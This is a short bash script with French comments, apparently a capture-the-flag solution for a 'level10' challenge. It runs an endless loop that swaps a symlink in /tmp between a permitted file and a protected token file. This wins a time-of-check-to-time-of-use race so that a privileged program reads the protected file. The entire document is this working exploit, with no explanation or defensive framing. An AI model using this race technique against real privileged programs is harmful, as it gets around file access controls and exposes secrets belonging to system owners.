#!/bin/bash

# Nom du lien symbolique
LINK="/tmp/my_link"

# Fichier autorisé
FILE1="/tmp/test"

# Fichier protégé
FILE2="/home/user/level10/token"

# Boucle infinie pour changer le lien
while true; do
    ln -sf "$FILE1" "$LINK"
    ln -sf "$FILE2" "$LINK"
done
